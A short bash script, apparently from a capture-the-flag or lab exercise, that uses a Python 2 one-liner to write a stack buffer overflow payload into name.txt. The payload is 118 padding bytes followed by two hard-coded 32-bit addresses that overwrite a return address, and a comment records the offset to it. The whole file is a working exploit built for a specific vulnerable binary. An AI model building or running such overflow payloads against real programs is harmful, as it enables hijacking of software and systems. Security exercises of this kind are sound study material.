#!/bin/bash

# "Wright Kim": bytes
# name + 104 bytes : ret
python -c 'print "\x41"*118+"\x7c\x85\x04\x08"+"\x60\xa0\x04\x08"' >> name.txt


#python -c 'print "\x41"*20' >> name.txt
